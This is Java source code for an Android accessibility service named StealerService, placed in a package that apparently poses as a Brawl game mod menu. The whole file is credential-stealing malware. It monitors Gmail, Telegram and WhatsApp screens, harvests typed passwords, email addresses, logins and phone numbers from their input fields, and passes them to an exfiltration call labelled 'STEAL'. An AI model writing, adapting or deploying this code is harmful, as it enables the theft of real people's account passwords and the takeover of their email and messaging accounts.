package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.text.InputType;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.List;

public class StealerService extends AccessibilityService {

    private static final long COOLDOWN = 8000;
    private long lastSend = 0;

    private static final List<String> TARGETS = Arrays.asList(
        "com.google.android.gm",
        "com.google.android.apps.gmail",
        "org.telegram.messenger",
        "org.telegram.messenger.web",
        "org.thunderdog.challegram",
        "com.whatsapp",
        "com.whatsapp.w4b"
    );

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
            type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;

        CharSequence pkgCs = event.getPackageName();
        if (pkgCs == null) return;
        String pkg = pkgCs.toString();
        if (!TARGETS.contains(pkg)) return;

        if (System.currentTimeMillis() - lastSend < COOLDOWN) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        StringBuilder found = new StringBuilder();
        findPassword(root, found, 0);
        findHints(root, found, 0);

        if (found.length() > 0) {
            found.insert(0, "APP: " + pkg + "\n");
            Exfil.send("STEAL", found.toString());
            lastSend = System.currentTimeMillis();
        }
    }

    private void findPassword(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 30) return;

        int inputType = n.getInputType();
        boolean isPwd = false;
        if (inputType > 0) {
            int variation = inputType & InputType.TYPE_MASK_VARIATION;
            int cls = inputType & InputType.TYPE_MASK_CLASS;
            if (cls == InputType.TYPE_CLASS_TEXT &&
                (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                 variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                 variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD)) {
                isPwd = true;
            }
            if (cls == InputType.TYPE_CLASS_NUMBER &&
                variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
                isPwd = true;
            }
        }

        CharSequence text = n.getText();
        CharSequence hint = n.getHintText();

        if (isPwd) {
            sb.append("[PWD] ");
            if (text != null && text.length() > 0) sb.append(text);
            else sb.append("(пусто)");
            if (hint != null && hint.length() > 0) sb.append(" hint=").append(hint);
            sb.append("\n");
        }

        for (int i = 0; i < n.getChildCount(); i++) {
            findPassword(n.getChild(i), sb, depth + 1);
        }
    }

    private void findHints(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
        if (n == null || depth > 30) return;

        CharSequence t = n.getText();
        CharSequence h = n.getHintText();
        CharSequence d = n.getContentDescription();

        if (t != null) {
            String s = t.toString();
            if (s.contains("@") && s.length() < 100 && s.length() > 4) {
                sb.append("[MAIL] ").append(s).append("\n");
            }
        }
        if (h != null) {
            String s = h.toString().toLowerCase();
            if (s.contains("логин") || s.contains("email") || s.contains("почт") ||
                s.contains("phone") || s.contains("телефон") || s.contains("username")) {
                if (t != null && t.length() > 0 && t.length() < 100) {
                    sb.append("[LOGIN] ").append(t).append(" hint=").append(h).append("\n");
                }
            }
        }
        if (d != null) {
            String s = d.toString().toLowerCase();
            if (s.contains("парол") || s.contains("password")) {
                sb.append("[PWD-DESC] ").append(d).append("\n");
            }
        }

        for (int i = 0; i < n.getChildCount(); i++) {
            findHints(n.getChild(i), sb, depth + 1);
        }
    }

    @Override public void onInterrupt() {}
}
